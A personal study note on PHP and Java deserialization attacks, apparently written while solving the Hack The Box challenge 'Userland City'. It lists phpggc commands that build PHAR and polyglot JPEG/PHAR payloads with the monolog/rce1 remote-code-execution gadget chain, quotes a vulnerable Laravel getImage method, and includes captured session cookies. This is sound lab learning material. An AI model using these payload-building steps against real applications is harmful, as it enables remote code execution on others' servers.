

Besides trying the codes despicted in 'hacktricks' and 'payloadllthethings':

For java desserialization, try: https://github.com/frohoff/ysoserial
For php, try: https://github.com/ambionics/phpggc


You can use phpggc command.

$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar
$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id
$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar
$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id
_________________________________________________________________________________________________________________________________

In the htb challenge 'Userland city':

"Through the disclosed code in the stack frames, we can confirm that <<<<file related operations are perform on images>>>>>> that can trigger a phar deserialisation through ProductsController's getImage method."
The code:
public function getImage(string $filename)
    {
        chdir('storage/images');
        if (!File::exists($filename))
        {
            return abort(404);
        }
        if (!Str::startsWith(File::mimeType($filename), 'image/'))
        {
            return abort(400);
        }
        return response()->file($filename);

I don't understand why I would supose, in this case, that I could exploit a deserialization. Maybe it would be just a guess, or maybe because, in the cookie, I saw values that seem to transmit values to be serialized and saved.

Cookie: mysession=MTY2Mzg4Nzk2NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpfLUNBQUVHYzNSeWFXNW5EQW9BQ0dGMWRHaDFjMlZ5Qm5OMGNtbHVad3dIQUFWeVpXVnpaUT09fLCYQl97C_YQH-g5BlzRxlxcLEpYJLkytASmO0BI-fyu; XSRF-TOKEN=eyJpdiI6IjZqVFZ1OWtOZnFmQjhVT09uZTdqTGc9PSIsInZhbHVlIjoiTVdOMVY2WEMvKzNrUVcvSHNwSXlKRGQrV2NYSmdhYnIzUFlBZHBmY0RQdzZTMTZVVWFlYzVVTzhLK0I5TEs5Q1hUZkNZYi9OSS9hcU5hQWdMVmI2eUlwcEFFbGp5cHFkNXVrZFRzUndmZklXT3pEeE5SY3pYWnZFVWs3RGlpQ1MiLCJtYWMiOiIyMTJlMmQ0NTdjNTYyNWZlMjZjMGUxYTlhZDg1ZDc3NmExMWEwZTQ2YTk1MjQ4YTRiOTI3MWUzZGVlZGM3NDI4In0%3D; laravel_session=eyJpdiI6IkM4YkJRQkZuOW0vaW5QMkorb2Zxenc9PSIsInZhbHVlIjoiaHZSaXpnSWJjRnB3Q0Q4OWxzQi82TVVCRWtyWEE0c2paczRlb0k2NkxPcGhvSWNFa3AzTkl2TEVjd3UraGZoZ2QwSEs1RmZ2b293QTJpa3JMTktTdk5la254eFFES01ZdlFCUGM5VkIyOXhRbHlRemNYMXRmM29YNlJnUVliM1AiLCJtYWMiOiI2MjVjYzFjZmJlMDQyODBhMWVlZGQ1MGJhNzNjYjE3ZjhhZjJkZGFmYjgzOGNhYjgwOTdiOWJhMTc4Mjk1MzgxIn0%3D

Command that I used:
php -d'phar.readonly=0' /usr/share/phpggc/phpggc --phar phar -f -o exploit.phar --fast-destruct monolog/rce1 system 'ls'
